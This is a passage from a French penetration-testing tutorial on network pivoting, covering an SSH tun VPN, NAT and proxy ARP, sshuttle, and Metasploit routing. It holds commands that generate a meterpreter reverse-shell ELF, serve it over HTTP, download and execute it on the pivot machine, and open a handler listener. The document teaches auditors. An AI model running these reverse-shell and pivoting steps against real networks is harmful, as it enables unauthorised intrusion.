										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/az-1024x655.png" class="attachment-large size-large" alt="Le pivoting dans le pentest avec Orange Cyberdefense" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-1024x655.png 1024w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-768x491.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-650x415.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-505x323.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-325x208.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-240x153.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az-150x96.png 150w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az.png 1142w" sizes="(max-width: 960px) 100vw, 960px" width="960" height="614">											</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-23f21cd elementor-widget elementor-widget-text-editor" data-id="23f21cd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Pour le VPN, il faut commencer par choisir un réseau qui n’est utilisé par aucun des deux côtés du lien : ici 10.43.43.0/30.</p><p>Nous allons donc commencer par monter le VPN, puis par fournir la configuration réseau.</p><p>Tout d’abord, il faut autoriser le tun device forwarding en ajoutant <span style="color: #ffffff; background-color: #474747; font-family: courier new;">PermitTunnel yes</span> dans <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/etc/ssh/sshd_config</span>.</p><p>Ensuite,
 il faut créer une interface tun sur la machine de l’auditeur et sur la 
machine pivot. Cette opération requiert d’être root.</p><p>Il y a deux façon de procéder :</p><p><strong>Solution n°1</strong> (à éviter)</p><p>Consiste à laisser l’option <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-w</span>
 d’openssh créer les interfaces tun elle-même. Cette solution est 
réellement à éviter car elle oblige à lancer le client openssh en root 
(eg. via sudo) sur la machine de l’auditeur et à se connecter avec le 
compte root sur la machine pivot (et donc d’avoir <span style="color: #ffffff; background-color: #474747; font-family: courier new;">PermitRootLogin yes</span> dans <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/etc/ssh/sshd_config</span>).</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-77d7cab elementor-widget elementor-widget-text-editor" data-id="77d7cab" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo ssh root@192.168.2.105 -w any:any</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ce9ab25 elementor-widget elementor-widget-text-editor" data-id="ce9ab25" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><span style="color: #ffffff; background-color: #474747; font-family: courier new;">any:any</span> laisse openssh choisir automatiquement les numéros (tunX) des interfaces tun respectivement côté client et côté serveur.</p><p>&nbsp;</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-cb9c742 elementor-widget elementor-widget-text-editor" data-id="cb9c742" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Solution n°2</strong> (recommandée)</p><p>Consiste
 à créer soi-même les interfaces tun. Cela a quand même le désavantage 
de devoir créer et supprimer manuellement les interfaces alors 
qu’openssh, lui, les crée et supprime automatiquement à la connexion et à
 la déconnexion de la session.</p><p>Sur le serveur pivot on crée 
l’interface tun, on lui attribue l’IP 10.43.43.1 en définissant le 
peering et on active l’interface :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-140c48a elementor-widget elementor-widget-text-editor" data-id="140c48a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo ip tuntap add dev tun0 mode tun</span><br><span style="color: #ffffff;">$ sudo ip addr add 10.43.43.1/30 peer 10.43.43.2 dev tun0</span><br><span style="color: #ffffff;">$ sudo ip link set tun0 up</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f86e536 elementor-widget elementor-widget-text-editor" data-id="f86e536" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>On fait de même sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b1c053a elementor-widget elementor-widget-text-editor" data-id="b1c053a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo ip tuntap add dev tun0 mode tun</span><br><span style="color: #ffffff;">$ sudo ip addr add 10.43.43.2/30 peer 10.43.43.1 dev tun0</span><br><span style="color: #ffffff;">$ sudo ip link set tun0 up</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7b0fdc5 elementor-widget elementor-widget-text-editor" data-id="7b0fdc5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ensuite, l’auditeur doit lancer le VPN over SSH depuis sa machine :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-82980c3 elementor-widget elementor-widget-text-editor" data-id="82980c3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh noraj@192.168.2.105 -w 0:0</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0555416 elementor-widget elementor-widget-text-editor" data-id="0555416" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Dans l’option ​<span style="color: #ffffff; background-color: #474747; font-family: courier new;">-w</span> il faut spécifier le numéro des interfaces tun que l’on a créées manuellement.</p><p><strong>Note : </strong></p><p><span style="color: #ffffff; background-color: #474747; font-family: courier new;">ping 10.43.43.1</span> pour vérifier que le tunnel est bien établi.</p><p>Ensuite il faut activer l’ip forwarding sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a19bf27 elementor-widget elementor-widget-text-editor" data-id="a19bf27" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo sysctl net.ipv4.conf.default.forwarding=1</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-99bac64 elementor-widget elementor-widget-text-editor" data-id="99bac64" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><em>Note au lecteur : Au sein des lignes de code, les guillemets français sont à considérer comme des guillemets anglais. </em><br><em>Il s’agit d’une mise en page automatique de WordPress que nous ne pouvons contourner.</em></p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ad66b0e elementor-widget elementor-widget-text-editor" data-id="ad66b0e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><span style="color: #ffffff; background-color: #474747; font-family: courier new;">&lt;Aparté&gt;</span> : Utiliser <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sysctl</span> évite de :</p><ul class="o-square-list"><li>Se connecter en root: <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sudo su root</span> puis <span style="color: #ffffff; background-color: #474747; font-family: courier new;">echo “1” &gt; /proc/sys/net/ipv4/conf/default/forwarding</span> car <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sudo echo “1” &gt; /proc/sys/net/ipv4/conf/default/forwarding</span> ne peut pas fonctionner à cause du redirecteur.</li><li>Utiliser deux commandes : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">echo “1” | sudo tee /proc/sys/net/ipv4/conf/default/forwarding</span></li><li>Même si c’est le cas pour 99% des systèmes, le procfs n’est pas forcément monté dans <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/proc/sys</span>.</li><li>Rentrer des valeurs erronées dans les fichiers système car <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sysctl</span> va vérifier que les valeurs sont valides.</li></ul><p><span style="color: #ffffff; background-color: #474747; font-family: courier new;">&lt;/Aparté&gt;</span></p><p>Ensuite
 l’auditeur veut accéder aux machines du réseau distant (ici Srv App 2) 
sans avoir à modifier la configuration de ce réseau.</p><p>Pour cela nous devrons configurer le NAT sur le serveur pivot et ajouter une route sur la machine de l’auditeur.</p><p>Pour la règle NAT on définit la source comme <span style="color: #ffffff; background-color: #474747; font-family: courier new;">10.43.43.2</span> (IP machine auditeur dans le VPN) et l’interface réseau qui permet d’accéder au réseau distant (<span style="color: #ffffff; background-color: #474747; font-family: courier new;">eth1</span>) ou bien le réseau de destination lui-même.</p><p>Il faut donc utiliser l’une des deux commandes suivantes sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-824bdea elementor-widget elementor-widget-text-editor" data-id="824bdea" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo iptables -t nat -A POSTROUTING -s 10.43.43.2 -o eth1 -j MASQUERADE</span><br><span style="color: #ffffff;">$ sudo iptables -t nat -A POSTROUTING -s 10.43.43.2 -d 10.42.42.0/24 -j MASQUERADE</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e808748 elementor-widget elementor-widget-text-editor" data-id="e808748" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Pour visualiser la règle de NAT que nous venons d’ajouter, on peut utiliser <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sudo iptables -t nat -L –line-numbers</span> et pour supprimer une règle NAT <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sudo iptables -t nat -D POSTROUTING 1</span> où <span style="color: #ffffff; background-color: #474747; font-family: courier new;">1</span> est le numéro de la règle NAT affichée avec la commande précédente.</p><p>Plutôt que le NAT, il est possible d’obtenir le même résultat en mettant en place un proxy ARP.</p><p>Il faut activer cette fonctionnalité par interface, par exemple pour <span style="color: #ffffff; background-color: #474747; font-family: courier new;">eth0</span> : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sudo sysctl net.ipv4.conf.eth0.proxy_arp=1</span>. Il est possible de remplacer le nom de l’interface par <span style="color: #ffffff; background-color: #474747; font-family: courier new;">all</span> pour le faire sur toutes les interfaces à la fois.</p><p>Puis
 il faut déclarer l’IP que l’on veut diffuser en ARP dans le réseau 
distant et spécifier derrière quelle interface elle se trouve.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8780cb4 elementor-widget elementor-widget-text-editor" data-id="8780cb4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo ip neigh add proxy 10.43.43.2 dev eth0</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-9a103de elementor-widget elementor-widget-text-editor" data-id="9a103de" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Qu’on ait opté pour le NAT ou le proxy ARP, il faut ajouter la route vers le réseau distant sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-acbbdac elementor-widget elementor-widget-text-editor" data-id="acbbdac" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo ip route add 10.42.42.0/24 via 10.43.43.1</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-df89dfa elementor-widget elementor-widget-text-editor" data-id="df89dfa" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>“Tunnellisation” de couche 2 (IP forwarding)</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Besoin que le serveur SSH soit activé</li><li>Besoin de connaître les login/mots de passe d’un utilisateur ou d’en créer un</li><li>Pas de serveur SSH natif sous Windows (sauf beta Windows 10)</li><li>Modification de la configuration du serveur SSH et redémarrage du service : nécessite les droits root</li><li>Activation de l’IP forwarding sur le serveur : nécessite les droits root</li><li>Mise en place de NAT sur le pivot : nécessite les droits root</li><li>Création d’une interface tun sur le pivot : nécessite les droits root</li><li>Beaucoup de configuration requise</li><li>Mise en place des pré-requis peu furtif</li><li>TPC over TCP (lent)</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a8c5fc5 elementor-widget elementor-widget-heading" data-id="a8c5fc5" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">sshuttle - Transparent proxy over ssh</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-a5a4991 elementor-widget elementor-widget-text-editor" data-id="a5a4991" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>sshuttle est disponible sur <a href="https://github.com/sshuttle/sshuttle">GitHub</a>.</p><p><span style="color: #ffffff; background-color: #474747; font-family: courier new;">sshuttle</span> fonctionne comme un proxy transparent à travers ssh.</p><p>Simple d’utilisation, il suffit d’utiliser la commande suivante pour transférer le trafic vers 10.42.42.0/24 à travers le pivot.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-15e5b11 elementor-widget elementor-widget-text-editor" data-id="15e5b11" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sshuttle -r noraj@192.168.2.105 10.42.42.0/24</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ab65a3c elementor-widget elementor-widget-text-editor" data-id="ab65a3c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ensuite <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sshtuttle</span> crée automatiquement les règles “iptables” afin que l’on puisse directement contacter le réseau distant sans configuration.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ed3225e elementor-widget elementor-widget-text-editor" data-id="ed3225e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ad89930 elementor-widget elementor-widget-text-editor" data-id="ad89930" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Il est aussi possible de laisser <span style="color: #ffffff; background-color: #474747; font-family: courier new;">sshuttle</span>
 automatiquement détecter les sous-réseaux à transférer en se basant sur
 la table de routage du serveur. À ce moment-là, il est plutôt avisé 
d’activer le premier niveau de verbosité afin de pouvoir consulter les 
règles créées automatiquement.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4776702 elementor-widget elementor-widget-text-editor" data-id="4776702" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sshuttle -vNr noraj@192.168.2.105 -x 192.168.1.0/24</span><br><span style="color: #ffffff;">Starting sshuttle proxy.</span><br><span style="color: #ffffff;">firewall manager: Starting firewall with Python version 3.7.4</span><br><span style="color: #ffffff;">firewall manager: ready method name nat.</span><br><span style="color: #ffffff;">IPv6 enabled: False</span><br><span style="color: #ffffff;">UDP enabled: False</span><br><span style="color: #ffffff;">DNS enabled: False</span><br><span style="color: #ffffff;">User enabled: False</span><br><span style="color: #ffffff;">TCP redirector listening on ('127.0.0.1', 12300).</span><br><span style="color: #ffffff;">Starting client with Python version 3.7.4</span><br><span style="color: #ffffff;">c : connecting to server...</span><br><span style="color: #ffffff;">Password:</span><br><span style="color: #ffffff;">Starting server with Python version 3.6.5</span><br><span style="color: #ffffff;">&nbsp;s: latency control setting = True</span><br><span style="color: #ffffff;">c : Connected.</span><br><span style="color: #ffffff;">&nbsp;s: auto-nets:True</span><br><span style="color: #ffffff;">&nbsp;s: available routes:</span><br><span style="color: #ffffff;">&nbsp;s:&nbsp;&nbsp; 2/10.42.42.0/24</span><br><span style="color: #ffffff;">&nbsp;s:&nbsp;&nbsp; 2/192.168.1.0/24</span><br><span style="color: #ffffff;">firewall manager: setting up.</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -N sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -F sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -I OUTPUT 1 -j sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -I PREROUTING 1 -j sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -A sshuttle-12300 -j RETURN --dest 192.168.1.0/24 -p tcp</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -A sshuttle-12300 -j REDIRECT --dest 10.42.42.0/24 -p tcp --to-ports 12300 -m ttl ! --ttl 42</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -A sshuttle-12300 -j REDIRECT --dest 192.168.1.0/24 -p tcp --to-ports 12300 -m ttl ! --ttl 42</span><br><span style="color: #ffffff;">^Cfirewall manager: undoing changes.</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -D OUTPUT -j sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -D PREROUTING -j sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -F sshuttle-12300</span><br><span style="color: #ffffff;">&gt;&gt; iptables -t nat -X sshuttle-12300</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-9b157fe elementor-widget elementor-widget-text-editor" data-id="9b157fe" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>L’option <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-x</span> permet d’exclure un sous-réseau pour ne pas le transmettre à travers le tunnel.</p><p>&nbsp;</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bdcd48e elementor-widget elementor-widget-text-editor" data-id="bdcd48e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Ouverture de port et cible dynamique</li><li>Fonctionne avec python 2 ou 3</li><li>Aucun déploiement sur le pivot</li><li>Package d’installation pour plusieurs OS</li><li>Très simple d’utilisation</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Besoin que le serveur SSH soit activé</li><li>Besoin de connaître les login/mot de passe d’un utilisateur</li><li>Nécessite python 2 ou 3 côté pivot (assez commun)</li><li>Tunnel TCP</li><li>Nécessite les droits root côté client</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-659b38b elementor-widget elementor-widget-heading" data-id="659b38b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Metasploit - autoroute, proxy SOCKS, local port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-01375e4 elementor-widget elementor-widget-text-editor" data-id="01375e4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Maintenant
 nous allons déployer un shell meterpreter sur la machine pivot et voir 
ce qu’il est possible de faire avec en terme de routage, proxying et de 
port forwarding.</p><p>Commençons par générer un reverse shell classique pour la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2042f5c elementor-widget elementor-widget-text-editor" data-id="2042f5c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.149 LPORT=8080 -f elf --platform linux --arch x64 &gt; reverse.elf</span><br><span style="color: #ffffff;">No encoder or badchars specified, outputting raw payload</span><br><span style="color: #ffffff;">Payload size: 129 bytes</span><br><span style="color: #ffffff;">Final size of elf file: 249 bytes</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4d17cff elementor-widget elementor-widget-text-editor" data-id="4d17cff" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Lançons un serveur HTTP pour le déploiement :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-23cc094 elementor-widget elementor-widget-text-editor" data-id="23cc094" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python -m http.server --bind 192.168.2.149</span><br><span style="color: #ffffff;">Serving HTTP on 192.168.2.149 port 8000 (http://192.168.2.149:8000/) ...</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-97fdef6 elementor-widget elementor-widget-text-editor" data-id="97fdef6" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Téléchargeons et rendons le shell exécutable :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d9f70c4 elementor-widget elementor-widget-text-editor" data-id="d9f70c4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ wget http://192.168.2.149:8000/reverse.elf</span><br><span style="color: #ffffff;">$ chmod u+x reverse.elf</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f11a0fb elementor-widget elementor-widget-text-editor" data-id="f11a0fb" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Avant de l’exécuter nous devons lancer le listener sur la machine auditeur.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-72b5643 elementor-widget elementor-widget-text-editor" data-id="72b5643" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ msfconsole -q</span><br><span style="color: #ffffff;">msf5 &gt; use exploit/multi/handler</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span style="color: #ffffff;">payload =&gt; linux/x64/meterpreter/reverse_tcp</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set LHOST 192.168.2.149</span><br><span style="color: #ffffff;">LHOST =&gt; 192.168.2.149</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set LPORT 8080</span><br><span style="color: #ffffff;">LPORT =&gt; 8080</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; run</span><br><br><span style="color: #ffffff;">[*] Started reverse TCP handler on 192.168.2.149:8080</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a850eb3 elementor-widget elementor-widget-text-editor" data-id="a850eb3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Maintenant nous pouvons exécuter le shell sur la machine pivot : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">./reverse.elf</span>.</p><p>Nous voyons le pivot se connecter à notre handler et nous obtenons un shell meterpreter.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6368553 elementor-widget elementor-widget-text-editor" data-id="6368553" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">[*] Sending stage (3021284 bytes) to 192.168.2.105</span><br><span style="color: #ffffff;">[*] Meterpreter session 1 opened (192.168.2.149:8080 -&gt; 192.168.2.105:42852) at 2019-08-29 18:12:15 +0200</span><br><br><span style="color: #ffffff;">meterpreter &gt;</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-58b7758 elementor-widget elementor-widget-text-editor" data-id="58b7758" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Jusqu’ici du très classique.</p><p>On peut utiliser la commande meterpreter <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ifconfig</span> pour découvrir les interfaces réseau mais ici nous connaissons déjà la topologie.</p><p>Nous
 devons demander à metasploit d’ajouter une règle de routage pour que 
notre machine puisse contacter le réseau distant. Nous allons mettre 
notre session meterpreter en arrière-plan et utiliser le module <span style="color: #ffffff; background-color: #474747; font-family: courier new;">autoroute</span>.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7d7aa32 elementor-widget elementor-widget-text-editor" data-id="7d7aa32" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; back</span><br><span style="color: #ffffff;">msf5 &gt; use post/multi/manage/autoroute</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set SESSION 1</span><br><span style="color: #ffffff;">SESSION =&gt; 1</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set CMD add</span><br><span style="color: #ffffff;">CMD =&gt; add</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set SUBNET 10.42.42.0</span><br><span style="color: #ffffff;">SUBNET =&gt; 10.42.42.0</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set NETMASK /24</span><br><span style="color: #ffffff;">NETMASK =&gt; /24</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; run</span><br><br><span style="color: #ffffff;">[!] SESSION may not be compatible with this module.</span><br><span style="color: #ffffff;">[*] Running module against 192.168.2.105</span><br><span style="color: #ffffff;">[*] Adding a route to 10.42.42.0/255.255.255.0...</span><br><span style="color: #ffffff;">[+] Route added to subnet 10.42.42.0/255.255.255.0.</span><br><span style="color: #ffffff;">[*] Post module execution completed</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set CMD print</span><br><span style="color: #ffffff;">CMD =&gt; print</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; run</span><br><br><span style="color: #ffffff;">[!] SESSION may not be compatible with this module.</span><br><span style="color: #ffffff;">[*] Running module against 192.168.2.105</span><br><br><span style="color: #ffffff;">IPv4 Active Routing Table</span><br><span style="color: #ffffff;">=========================</span><br><br><span style="color: #ffffff;">&nbsp;&nbsp; Subnet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Netmask&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gateway</span><br><span style="color: #ffffff;">&nbsp;&nbsp; ------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------</span><br><span style="color: #ffffff;">&nbsp;&nbsp; 10.42.42.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 255.255.255.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Session 1</span><br><br><span style="color: #ffffff;">[*] There are currently no IPv6 routes defined.</span><br><span style="color: #ffffff;">[*] Post module execution completed</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-59001c1 elementor-widget elementor-widget-text-editor" data-id="59001c1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Metasploit
 possède un module pour Windows qui permet de faire un scan ARP afin 
d’essayer de détecter de nouvelles machines sur le réseau distant. Ce 
modèle s’appelle <span style="color: #ffffff; background-color: #474747; font-family: courier new;">post/windows/gather/arp_scanner</span>
 mais il n’y a malheureusement pas d’équivalent pour Linux. Ce n’est pas
 un problème ici comme nous savons que nous voulons joindre <span style="color: #ffffff; background-color: #474747; font-family: courier new;">10.42.42.2</span>.</p><p>Nous pouvons maintenant démarrer un proxy SOCKS avec le module <span style="color: #ffffff; background-color: #474747; font-family: courier new;">auxiliary/server/socks4a</span>.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d77180c elementor-widget elementor-widget-text-editor" data-id="d77180c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
